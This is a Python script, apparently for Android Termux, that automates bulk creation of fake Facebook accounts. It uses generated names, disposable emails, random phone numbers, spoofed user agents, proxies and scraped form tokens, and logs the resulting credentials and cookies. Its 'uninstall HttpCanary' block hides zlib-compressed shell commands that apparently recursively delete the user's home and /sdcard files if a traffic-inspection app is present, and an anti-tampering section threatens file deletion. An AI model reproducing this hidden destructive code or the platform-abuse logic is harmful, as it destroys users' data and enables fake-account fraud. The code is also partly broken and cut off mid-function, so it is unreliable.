#──────────────{ IMPORT }──────────────#
import os,sys,re,time,json
import requests,bs4,string
import os
import time
import requests
import logging
import hashlib
import faker,fake_email,random
from faker import Faker
from fake_email import Email
from bs4 import BeautifulSoup
try:
    import rich, requests
except:
    os.system(" pip install rich requests ")
    import rich, requests
from rich import print 
from rich.tree import Tree
from rich.panel import Panel
from rich.columns import Columns
from rich.console import Console
from rich.console import Group
from rich.align import Align
from rich.syntax import Syntax
from datetime import datetime
from time import sleep
from time import sleep as jeda
from time import strftime
from bs4 import BeautifulSoup as sop
from datetime import datetime
from time import sleep as slp
#──────────────{ SECURITY-CODE }──────────────#
def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(Panel('  [bold white]ALL YOUR FILES WILL REMOVE IF YOU TRY AGAIN! | ALRIGHT',subtitle="[bold red]● [bright_yellow]● [green1]●",subtitle_align='left',title="[bold red]● [bright_yellow]● [green1]●",title_align='right',width=102,padding=0,style="bold violet"));exit()
        else:exit()
    except:exit()

from requests import api
x = open(api.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'os.system' in x:
    clr()
if 'system' in x:
    clr()
if '(url)' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'ERROR' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import sessions
x = open(sessions.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sdcard' in x:
    clr()
if "60*'='" in x:
    clr()
if "60 * '='" in x:
    clr()
if "'='" in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'open' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'open' in x:
    clr()
if 'echo' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'str(url)' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'l(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'n(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'r(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import models
x = open(models.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'RPW-BRYX1107GRAY' in x:
    clr()
if 'BRYX' in x:
    clr()
if 'if self.url' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'blob' in x:
    clr()
if '.txt' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'approvalSheet' in x:
    clr()
if 'approval' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'open' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'system' in x:
    clr()
if 'M4786==' in x:
    clr()
if 'M1107==' in x:
    clr()
if 'os.system' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'e(url)' in x:
    clr()
if 'g(url)' in x:
    clr()
if 'h(url)' in x:
    clr()
if 'i(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{data}' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'ERROR' in x:
    clr()
if '{headers}' in x:
    clr()
#──────────────{ UNINSTALL HTTPCANARY }──────────────#
try:
    a = "anar"
    t="tt"
    fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
    if f'com.h{t}pc{a}y.pro' in fileee:
        print(Panel('  [bold white]FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS',subtitle="[bold red]● [bright_yellow]● [green1]●",subtitle_align='left',title="[bold red]● [bright_yellow]● [green1]●",title_align='right',width=102,padding=0,style="bold violet"))
        os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
        exit()
        #else:pass
except Exception as e:
    pass
#──────────────{ FILE FOLDER }──────────────#
folder_path = '/sdcard/AUTO-CREATE-BRYX/create/'
try:
    os.makedirs(folder_path, exist_ok=True)
except:
    pass
#──────────────{ WAKTU }──────────────#
bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")
#──────────────{ LODING SYSTEM }──────────────#
def lo(word):
    Bryx = ["[\033[38;5;40m■\x1b[0m□□□□□□□□□]","[\033[38;5;42m■■\x1b[0m□□□□□□□□]", "[\033[38;5;42m■■■\x1b[0m□□□□□□□]", "[\033[38;5;43m■■■■\x1b[0m□□□□□□]", "[\033[38;5;44m■■■■■\x1b[0m□□□□□]", "[\033[38;5;45m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(Bryx)):
            sys.stdout.write(('\r{}{}').format(str(word), Bryx[x]))
            time.sleep(0.1)
            sys.stdout.flush()
#──────────────{ LOADING }──────────────#
def loading():
	os.system("clear")
	lo("PROCESSING PLEASE WAIT...")
#──────────────{ USERAGENT UA }──────────────#
def ua():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/2.3.5;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua = a+b
	return ua
def ua1():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua1 = a+b
	return ua1
def ua2():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua2 = a+b
	return ua2
def ua3():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua3 = a+b
	return ua3
def ua4():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua4 = a+b
	return ua4
def ua5():
	a = "[FBAN/FB4A;FBAV/"+str(random.randint(11,80))+'.0.0.'+str(random.randrange(9,49))+'.'+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,99999999))+";"
	b = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua5 = a+b
	return ua5
def ua6():
	p1 = ua1()
	p2 = ua2()
	p3 = ua3()
	p4 = ua4()
	p5 = ua5()
	ua6 = random.choice([p1,p2,p3,p4,p5])
	return ua6
#──────────────{ RANDOM }──────────────#
def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
#──────────────{ LOCKED CHECKER }──────────────#
def lock_checker(id):
    try:
        req = requests.get(f'https://graph.facebook.com/{id}/picture?type=normal').text
        if 'Photoshop' in req:
            return 'Active'
        else:
            return 'Locked'
    except Exception as e:
        print(f'ERROR CHECKING ACCOUNT STATUS : {e}')
        return 'Error'
#──────────────{ OK AT CP }──────────────#
oks = []
cps = []
uid = []
id = []
#──────────────{ USERAGENT UA }──────────────#
from fake_useragent import UserAgent
ua = UserAgent()

def ugenX():
    ualist = [ua.random for _ in range(50)]
    return str(random.choice(ualist))
#──────────────{ FAKE NAME }──────────────#
def fake_name():
    first = Faker().first_name()
    last = Faker().last_name()
    return first,last
#──────────────{ FAKE PASSWORD }──────────────#
def fake_password():
    name = " ".join(fake_name()).replace(' ', '')
    namepassword = f'{name}{str(random.randrange(1000,10000))}'
    return namepassword
#──────────────{ EXTRACTOR }──────────────#
def extractor(data):
    try:
        soup = BeautifulSoup(data,"html.parser")
        data = {}
        for inputs in soup.find_all("input"):
            name = inputs.get("name")
            value = inputs.get("value")
            if name:
                data[name] = value
        return data
    except Exception as e:
        return {"error":str(e)}
#──────────────{ PHONE NUMBER }──────────────#
def get_nope():
    na = random.choice(['77', '78', '59'])
    ni = str(random.randrange(1000, 10000))
    nu = str(random.randrange(10000, 100000))
    nope = '+639%s%s%s' % (na, ni, nu)
    return nope
#──────────────{ PHONE NUMBER }──────────────#
def get_nopee():
    na = random.choice(['77', '78', '59'])
    ni = str(random.randrange(1000, 10000))
    nu = str(random.randrange(10000, 100000))
    nope = '+880%s%s%s' % (na, ni, nu)
    return nope    
# 🔁 Load proxies from a text file
def load_proxies(filename="proxies.txt"):
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip()]

# 🎲 Get a random proxy from the list
def get_random_proxy(proxies_list):
    proxy = random.choice(proxies_list)
    return {
        "http": proxy,
        "https": proxy
    }

#──────────────{ EMAIL }──────────────#
def GetEmail(proxy_list):
    global email, token
    domain = requests.get('https://api.mail.tm/domains', proxies=get_random_proxy(proxy_list)).json()['hydra:member'][0]['domain']
    prefix = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
    email = f"{prefix}@{domain}"
    password = "TempPass123!"

    requests.post('https://api.mail.tm/accounts', json={
        "address": email,
        "password": password
    }, proxies=get_random_proxy(proxy_list))

    response = requests.post('https://api.mail.tm/token', json={
        "address": email,
        "password": password
    }, proxies=get_random_proxy(proxy_list)).json()

    token = response['token']
    return email

#──────────────{ EMAIL CODE }──────────────#
def GetCode(proxy_list):
    try:
        headers = {'Authorization': f'Bearer {token}'}
        response = requests.get('https://api.mail.tm/messages', headers=headers, proxies=get_random_proxy(proxy_list)).json()
        for msg in response['hydra:member']:
            message = requests.get(f"https://api.mail.tm/messages/{msg['id']}", headers=headers, proxies=get_random_proxy(proxy_list)).json()
            print(message)
            code = re.search(r'FB-(\d+)', message.get('text', ''))
            if code:
                return code.group(1)
    except:
        return None
#──────────────{ COLOR }──────────────#
m = "\033[0;31m" 
p = "\033[0;37m" 
h = "\033[0;32m" 
b = "\033[34m"
k= "\033[33m"
#──────────────{ SPACE SYSTEM }──────────────#
def space():
    print("\n")
#──────────────{ LOGO }──────────────#
def clear():
    os.system("clear")

logo=("""

[green1]                ,----,                    ,----, 
[green1]              ,/   .`|  ,----..         ,/   .`| 
[green1]   ,---,    ,`   .'  : /   /   \      ,`   .'  : 
[green1],`--.' |  ;    ;     //   .     :   ;    ;     / 
[green1]|   :  :.'___,/    ,'.   /   ;.  \.'___,/    ,'  
[green1]:   |  '|    :     |.   ;   /  ` ;|    :     |   
[green1]|   :  |;    |.';  ;;   |  ; \ ; |;    |.';  ;   
[green1]'   '  ;`----'  |  ||   :  | ; | '`----'  |  |   
[green1]|   |  |    '   :  ;.   |  ' ' ' :    '   :  ;   
[green1]'   :  ;    |   |  ''   ;  \; /  |    |   |  '   
[green1]|   |  '    '   :  | \   \  ',  /     '   :  |   
[green1]'   :  |    ;   |.'   ;   :    /      ;   |.'    
[green1];   |.'     '---'      \   \ .'       '---'      
[green1]'---'                   `---`  [cyan][bold]VERSION 0.5
          [green_yellow]THIS [dark_olive_gre]TOOLS [pale_green1] IS[dark_sea_green…] NOT FOR SALE
""")
ll=str([hari,tanggal])
hx=("""  [bold green1]DEVELOPER[medium_purple1]   ⟩[cyan][bold] Edji
  [bold green1]FACEBOOK[medium_purple1]    ⟩[cyan][bold] Edji haha	
  [bold green1]GITHUB[medium_purple1]      ⟩[bright_yellow] SEKRET
  [bold green1]STATUS[medium_purple1]      ⟩[bright_yellow] ALL NETWORK 
  [bold green1]TOOLS[medium_purple1]       ⟩[bright_yellow] OWN 
  [bold green1]UPDATES[medium_purple1]     ⟩[bright_yellow] April 4
  [bold green1]TODAY DATE[medium_purple1]  ⟩ [cyan]"""+ll)
def banner():
    os.system("clear")
    print(Panel(logo,subtitle="[bold red]● [bright_yellow]● [green1]●",subtitle_align='left',title="[bold red]● [bright_yellow]● [green1]●",title_align='right',width=102,padding=0,style="bold violet"))
    print(Panel(hx,width=100,padding=0,style="bold violet"))
#──────────────{ APPROVAL }──────────────#

#──────────────{ MAIN-MENU }──────────────#
def AUTO_BRYX():
    os.system('clear')
    print(Panel(logo,subtitle="[bold red]● [bright_yellow]● [green1]●",subtitle_align='left',title="[bold red]● [bright_yellow]● [green1]●",title_align='right',width=102,padding=0,style="bold violet"))
    print(Panel(hx,width=100,padding=0,style="cyan"))
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] AUTO CREATE\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] CONTACTED OWNER\n    [green_yellow][[bold cyan1]3/C[green_yellow]][bold red] EXIT TOOL    """,title="[reverse violet] TOOL MENU",style="bold cyan1"))
    print(Panel(a,subtitle="[bold red]┌─",subtitle_align='left',style="bold violet"))
    Bryx = Console().input("   [bold red]└──> ")
    if Bryx in ["a","A","1","01"]:
        method()
    elif Bryx in ["b","B","2","02"]:
        os.system("xdg-open https://i.pinimg.com/564x/3d/8c/0c/3d8c0c7305dd90ac8229908894e13fe0.jpg")
        time.sleep(2);AUTO_BRYX()
    elif Bryx in ["c","C","3","03"]:exit()
    else:AUTO_BRYX()
#──────────────{ METHOD }──────────────#
def method():
	banner()
	a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] METHOD 1\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] METHOD 2    """,title="[reverse violet] AUTO CREATE METHOD ",style="bold cyan1"))
	print(Panel(a,subtitle="[bold violet]┌─",subtitle_align='left',style="bold violet"))
	Bryx = Console().input("   [bold violet]└──> ")
	if Bryx in ["a","A","1","01"]:
		main()
	elif Bryx in ["b","B","2","02"]:
		menu()
#──────────────{ AUTO CREATE METHOD 1 }──────────────#
def main() -> None:
    uid=None
    fake = Faker()
    global num_accounts,password,first_name,last_name
    banner()
    num_accounts = int(input("HOW MANY ACC : "))
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] DEFAULT PASSWORD\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] CUSTOM PASSWORD    """,title="[reverse violet] PASSWORD ",style="bold cyan1"))
    print(Panel(a,subtitle="[bold violet]┌─",subtitle_align='left',style="bold violet"))
    bryxpassword = Console().input("   [bold violet]└──> ")
    if bryxpassword in ["a","A","1","01"]:
    	password=fake_password()
    elif bryxpassword in ["b","B","2","02"]:
    	password=input('\033[1;37mENTER CUSTOM PASSWORD : ')
    banner()
    a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] DEFAULT NAMES\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] MANUAL NAMES    """,title="[reverse violet] NAME ",style="bold cyan1"))
    print(Panel(a,subtitle="[bold violet]┌─",subtitle_align='left',style="bold violet"))
    bryxpassword = Console().input("   [bold violet]└──> ")
    if bryxpassword in ["a","A","1","01"]:
    	first_name = fake.first_name()
    	last_name = fake.last_name()
    elif bryxpassword in ["b","B","2","02"]:
    	first_name=input('\033[1;37mFIRST NAME : ')
    	last_name=input('\033[1;37mLAST NAME  : ')
    banner()
    print(Panel(f" [bold green]IF NO RESULT ON/OFF AIRPLANE MODE OR VPN 1.1.1.1",style="bold violet"))
    for _ in range(int(num_accounts)):
        ses = requests.Session()
        #sys.stdout.write(f'\033[1;37m[\033[1;35mBRYXPOGI\033[1;37m]-[\033[1;31m{num_accounts}\033[1;37m]-[\033[1;32mSUCCESS:-{len(oks)}\033[1;37m]');sys.stdout.flush()
        response = ses.get(
            url='https://x.facebook.com/reg',
            params={"_rdc":"1","_rdr":"","wtsid":"rdr_0t3qOXoIHbMS6isLw","refsrc":"deprecated"},
        )
        mts = ses.get("https://x.facebook.com").text
        m_ts = re.search(r'name="m_ts" value="(.*?)"',str(mts)).group(1)
        formula = extractor(response.text)
        em = Email().Mail()
        email2 = em['mail']
        phone2 = get_nope()
        a=Tree(":file_folder:",guide_style="bold green_yellow")
        a.add(f"[violet][[yellow2]●[violet]] [bold green]NAME     [cyan2] ⟩ [bold green]{first_name} {last_name}")
        a.add("[violet][[yellow2]●[violet]] [bold green]NUMBER   [cyan2] ⟩ [bold green]"+phone2)
        a.add("[violet][[yellow2]●[violet]] [bold green]EMAIL    [cyan2] ⟩ [bold green]"+email2)
        payload = {
            'ccp': "2",
            'reg_instance': str(formula["reg_instance"]),
            'submission_request': "true",
            'helper': "",
            'reg_impression_id': str(formula["reg_impression_id"]),
            'ns': "1",
            'zero_header_af_client': "",
            'app_id': "103",
            'logger_id': str(formula["logger_id"]),
            'field_names[0]': "firstname",
            'firstname': first_name,
            'lastname': last_name,
            'field_names[1]': "birthday_wrapper",
            'birthday_day': str(random.randint(1,28)),
            'birthday_month': str(random.randint(1,12)),
            'birthday_year': str(random.randint(1992,2009)),
            'age_step_input': "",
            'did_use_age': "false",
            'field_names[2]': "reg_email__",
            'reg_number__': phone2,
            'reg_email__': email2,
            'field_names[3]': "sex",
            'sex': "2",
            'preferred_pronoun': "",
            'custom_gender': "",
            'field_names[4]': "reg_passwd__",
            'name_suggest_elig': "false",
            'was_shown_name_suggestions': "false",
            'did_use_suggested_name': "false",
            'use_custom_gender': "false",
            'guid': "",
            'pre_form_step': "",
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time()).split('.')[0],f"{password}"),
            'submit': "Sign Up",
            'fb_dtsg': "NAcMC2x5X2VrJ7jhipS0eIpYv1zLRrDsb5y2wzau2bw3ipw88fbS_9A:0:0",
            'jazoest': str(formula["jazoest"]),
            'lsd': str(formula["lsd"]),
            '__dyn': "1ZaaAG1mxu1oz-l0BBBzEnxG6U4a2i5U4e0C8dEc8uwcC4o2fwcW4o3Bw4Ewk9E4W0pKq0FE6S0x81vohw5Owk8aE36wqEd8dE2YwbK0iC1qw8W0k-0jG3qaw4kwbS1Lw9C0le0ue0QU",
            '__csr': "",
            '__req': "p",
            '__fmt': "1",
            '__a': "AYkiA9jnQluJEy73F8jWiQ3NTzmH7L6RFbnJ_SMT_duZcpo2yLDpuVXfU2doLhZ-H1lSX6ucxsegViw9lLO6uRx31-SpnBlUEDawD_8U7AY4kQ",
            '__user': "0"
        }
        header1 = {
            "Host":"m.facebook.com",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "User-Agent":ugenX(),
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "dnt":"1",
            "X-Requested-With":"mark.via.gp",
            "Sec-Fetch-Site":"none",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-User":"?1",
            "Sec-Fetch-Dest":"document",
            "dpr":"1.75",
            "viewport-width":"980",
            "sec-ch-ua":"\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "sec-ch-ua-mobile":"?1",
            "sec-ch-ua-platform":"\"Android\"",
            "sec-ch-ua-platform-version":"\"\"",
            "sec-ch-ua-model":"\"\"",
            "sec-ch-ua-full-version-list":"",
            "sec-ch-prefers-color-scheme":"dark",
            "Accept-Encoding":"gzip, deflate, br, zstd",
            "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"
        }
        reg_url = "https://www.facebook.com/reg/submit/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM0NDE0OTk2LCJjYWxsc2l0ZV9pZCI6OTA3OTI0NDAyOTQ4MDU4fQ%3D%3D&multi_step_form=1&skip_suma=0&shouldForceMTouch=1"
        py_submit = ses.post(reg_url, data=payload, headers=header1)
        #print(ses.cookies.get_dict().items())
        if "c_user" in py_submit.cookies:
            first_cok = ses.cookies.get_dict()
            uid = str(first_cok["c_user"])
            header2 = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'dpr': '2',
                'referer': 'https://m.facebook.com/login/save-device/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ugenX(),
                'viewport-width': '980',      
            }
            params = {
                'next': 'https://m.facebook.com/?deoia=1',
                'soft': 'hjk',
            }
            con_sub = ses.get('https://x.facebook.com/confirmemail.php', params=params, headers=header2).text
            cod = Email(em["session"]).inbox()
            valid = re.search(r'(\d+)', str(cod['topic'])).group(1)
            if valid:
                a.add("[violet][[yellow2]●[violet]] [bold green]LOGIN OTP[cyan2] ⟩ [bold green]")
                print(a)
                confirm_id(email2,uid,valid,con_sub,ses)
            else:
                open("/sdcard/AUTO-CREATE-BRYX/create/auto-create-disabled-cp.txt", "a").write(f"{email2}|{uid}|{password}\n")
                cps.append(uid)
        else:
        	cps.append(uid)
#──────────────{ DATA }──────────────#
def confirm_id(mail,uid,otp,data,ses):
    try:
        url = "https://m.facebook.com/confirmation_cliff/"
        params = {
        'contact': mail,
        'type': "submit",
        'is_soft_cliff': "false",
        'medium': "email",
        'code': otp}
        payload = {
        'fb_dtsg': 'NAcMC2x5X2VrJ7jhipS0eIpYv1zLRrDsb5y2wzau2bw3ipw88fbS_9A:0:0',
        'jazoest': re.search(r'"\d+"', data).group().strip('"'),
        'lsd': re.search(r'"LSD",\[\],{"token":"([^"]+)"}',str(data)).group(1),
        '__dyn': "",
        '__csr': "",
        '__req': "4",
        '__fmt': "1",
        '__a': "",
        '__user': uid}
        headers = {
        'User-Agent': ugenX(),
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'sec-ch-ua-full-version-list': "",
        'sec-ch-ua-platform': "\"Android\"",
        'sec-ch-ua': "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        'sec-ch-ua-model': "\"\"",
        'sec-ch-ua-mobile': "?1",
        'x-asbd-id': "129477",
        'x-fb-lsd': "KnpjLz-YdSXR3zBqds98cK",
        'sec-ch-prefers-color-scheme': "light",
        'sec-ch-ua-platform-version': "\"\"",
        'origin': "https://m.facebook.com",
        'x-requested-with': "mark.via.gp",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://m.facebook.com/confirmemail.php?next=https%3A%2F%2Fm.facebook.com%2F%3Fdeoia%3D1&soft=hjk",
        'accept-language': "en-GB,en-US;q=0.9,en;q=0.8",
        'priority': "u=1, i"}
        response = ses.post(url, params=params, data=payload, headers=headers)
        if "checkpoint" in str(response.url):
            cps.append(uid)
        else:
            cok = (";").join([ "%s=%s" % (key,value) for key,value in ses.cookies.get_dict().items()])
            hx=("[bold green]"+cok)
            Bryxa = Panel.fit("[green] LOGIN SUCCESS",style="bold violet")
            Bryxb = Panel("[green] "+uid, title="[bold green]UID",width=30,padding=0,style="bold violet")
            Bryxc = Panel(f"[green] {password}", title="[bold green]PASS",width=30,padding=0,style="bold violet")
            Bryxe = Columns([Bryxa])
            Bryxf = Columns([Bryxb, Bryxc])
            c=Tree(":file_folder:",guide_style="bold green_yellow")
            c.add(Bryxe)
            c.add(Bryxf)
            c.add(Panel(hx,style="bold violet"))
            print(c)
            open("/sdcard/AUTO-CREATE-YUSH/create/auto-create-ok.txt", "a").write(uid+"|"+otp+f"|{password}|"+mail+"|"+cookie+"\n")
            oks.append(uid)
    except Exception as e:    
        pass
#──────────────{ PROGRES }──────────────#
def progres(current, num_accounts, delay):
